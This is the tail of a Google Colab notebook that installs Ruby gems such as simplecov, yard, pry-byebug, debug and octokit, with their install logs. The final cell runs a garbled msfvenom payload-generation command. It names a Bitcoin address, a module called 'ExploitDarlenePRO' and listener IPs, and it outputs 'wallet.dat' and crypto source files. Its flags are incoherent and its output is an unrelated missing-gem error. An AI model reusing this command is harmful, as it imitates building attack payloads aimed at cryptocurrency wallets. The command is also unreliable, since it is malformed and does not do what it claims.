            "ERROR:  Possible alternatives: simplecov, simplecov-badge, simplecov-bamboo, simplecov-clover, simplecov-csv, simplecov-db, simplecov-erb, simplecov-html, simplecov-json, simplecov-lcov\n",
            "1 gem installed\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!gem install simplecov -v 0.18.2"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "esQBxEMy2N9d",
        "outputId": "9f738d3f-e463-4363-df52-34a6db2e46a8"
      },
      "execution_count": 126,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Fetching simplecov-0.18.2.gem\n",
            "Successfully installed simplecov-0.18.2\n",
            "Parsing documentation for simplecov-0.18.2\n",
            "Installing ri documentation for simplecov-0.18.2\n",
            "Done installing documentation for simplecov after 0 seconds\n",
            "1 gem installed\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!gem install redcarpet -v 3.6.0"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "L0sOFeZU23EW",
        "outputId": "89f11842-897d-4690-d525-f46d8cb4ab90"
      },
      "execution_count": 128,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Fetching redcarpet-3.6.0.gem\n",
            "Building native extensions. This could take a while...\n",
            "Successfully installed redcarpet-3.6.0\n",
            "Parsing documentation for redcarpet-3.6.0\n",
            "Installing ri documentation for redcarpet-3.6.0\n",
            "Done installing documentation for redcarpet after 0 seconds\n",
            "1 gem installed\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!gem install yard -v 0.9.37"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "peU7bapY2_mQ",
        "outputId": "5215cc4e-a871-484c-8882-565c50492c7e"
      },
      "execution_count": 130,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Fetching yard-0.9.37.gem\n",
            "Successfully installed yard-0.9.37\n",
            "Parsing documentation for yard-0.9.37\n",
            "Installing ri documentation for yard-0.9.37\n",
            "Done installing documentation for yard after 4 seconds\n",
            "1 gem installed\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!gem install pry-byebug -v 3.10.1"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "eh7fKCti3N92",
        "outputId": "43e6bf94-80e6-42bb-b099-1eb50ccc771a"
      },
      "execution_count": 132,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Fetching pry-byebug-3.10.1.gem\n",
            "Fetching method_source-1.1.0.gem\n",
            "Fetching coderay-1.1.3.gem\n",
            "Fetching pry-0.14.2.gem\n",
            "Fetching byebug-11.1.3.gem\n",
            "Successfully installed method_source-1.1.0\n",
            "Successfully installed coderay-1.1.3\n",
            "Successfully installed pry-0.14.2\n",
            "Building native extensions. This could take a while...\n",
            "Successfully installed byebug-11.1.3\n",
            "Successfully installed pry-byebug-3.10.1\n",
            "Parsing documentation for method_source-1.1.0\n",
            "Installing ri documentation for method_source-1.1.0\n",
            "invalid options: -SNw2\n",
            "(invalid options are ignored)\n",
            "Parsing documentation for coderay-1.1.3\n",
            "Installing ri documentation for coderay-1.1.3\n",
            "Parsing documentation for pry-0.14.2\n",
            "Installing ri documentation for pry-0.14.2\n",
            "Parsing documentation for byebug-11.1.3\n",
            "Installing ri documentation for byebug-11.1.3\n",
            "Parsing documentation for pry-byebug-3.10.1\n",
            "Installing ri documentation for pry-byebug-3.10.1\n",
            "Done installing documentation for method_source, coderay, pry, byebug, pry-byebug after 29 seconds\n",
            "5 gems installed\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!gem install debug -v 1.8.0"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "qZxAr5w73hUj",
        "outputId": "83637142-c800-4f39-cc50-6d349210ad8e"
      },
      "execution_count": 134,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Fetching irb-1.14.1.gem\n",
            "Fetching reline-0.5.11.gem\n",
            "Fetching debug-1.8.0.gem\n",
            "Successfully installed reline-0.5.11\n",
            "Successfully installed irb-1.14.1\n",
            "Building native extensions. This could take a while...\n",
            "Successfully installed debug-1.8.0\n",
            "Parsing documentation for reline-0.5.11\n",
            "Installing ri documentation for reline-0.5.11\n",
            "Parsing documentation for irb-1.14.1\n",
            "Installing ri documentation for irb-1.14.1\n",
            "Parsing documentation for debug-1.8.0\n",
            "Installing ri documentation for debug-1.8.0\n",
            "Done installing documentation for reline, irb, debug after 4 seconds\n",
            "3 gems installed\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!gem install octokit -v 4.25.1"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Z03gSUoi3us4",
        "outputId": "4ad88e14-857c-4ffb-805e-1eafc56ba830"
      },
      "execution_count": 136,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Fetching faraday-2.12.1.gem\n",
            "Fetching octokit-4.25.1.gem\n",
            "Fetching net-http-0.5.0.gem\n",
            "Fetching public_suffix-6.0.1.gem\n",
            "Fetching addressable-2.8.7.gem\n",
            "Fetching faraday-net_http-3.4.0.gem\n",
            "Fetching sawyer-0.9.2.gem\n",
            "Successfully installed net-http-0.5.0\n",
            "Successfully installed faraday-net_http-3.4.0\n",
            "Successfully installed faraday-2.12.1\n",
            "Successfully installed public_suffix-6.0.1\n",
            "Successfully installed addressable-2.8.7\n",
            "Successfully installed sawyer-0.9.2\n",
            "Successfully installed octokit-4.25.1\n",
            "Parsing documentation for net-http-0.5.0\n",
            "Installing ri documentation for net-http-0.5.0\n",
            "Parsing documentation for faraday-net_http-3.4.0\n",
            "Installing ri documentation for faraday-net_http-3.4.0\n",
            "Parsing documentation for faraday-2.12.1\n",
            "Installing ri documentation for faraday-2.12.1\n",
            "Parsing documentation for public_suffix-6.0.1\n",
            "Installing ri documentation for public_suffix-6.0.1\n",
            "Parsing documentation for addressable-2.8.7\n",
            "Installing ri documentation for addressable-2.8.7\n",
            "Parsing documentation for sawyer-0.9.2\n",
            "Installing ri documentation for sawyer-0.9.2\n",
            "Parsing documentation for octokit-4.25.1\n",
            "Installing ri documentation for octokit-4.25.1\n",
            "Done installing documentation for net-http, faraday-net_http, faraday, public_suffix, addressable, sawyer, octokit after 4 seconds\n",
            "7 gems installed\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!gem install memory_profiler -v 1.1.0"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "_xy3hPiH3wuE",
        "outputId": "f57919b9-4ef9-41b2-f716-a0bfd3daca16"
      },
      "execution_count": 172,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "ERROR:  Error installing memory_profiler:\n",
            "\tmemory_profiler-1.1.0 requires Ruby version >= 3.1.0. The current ruby version is 3.0.2.107.\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!gem install debug -v 1.8.0"
      ],
      "metadata": {
        "id": "tEQDW5cK3wnd"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!gem install debug -v 1.8.0"
      ],
      "metadata": {
        "id": "8eGlGg1r3wgi"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "!./msfvenom 1BtcyRUBwLv9AU1fCyyn4pkLjZ99ogdr7b -p modules/exploits/ExploitDarlenePRO LHOST=172.28.0.12 -f RB -o decode_core.rb -p bitcoin/src/crypto LHOST=172.28.255.255 -f CPP -o aes.cpp -p bitcoin/src/crypto LHOST=172.28.0.12 -f DAT -o wallet.dat"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "wBrrp1z_sHY7",
        "outputId": "58e4f8d1-af19-4fa5-8330-03785141127e"
      },
      "execution_count": 171,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\u001b[33m\u001b[31mCould not find memory_profiler-1.1.0 in any of the sources\u001b[0m\u001b[0m\n",
            "\u001b[33m\u001b[33mRun `bundle install` to install missing gems.\u001b[0m\u001b[0m\n"
          ]
        }
      ]
    }
  ]
}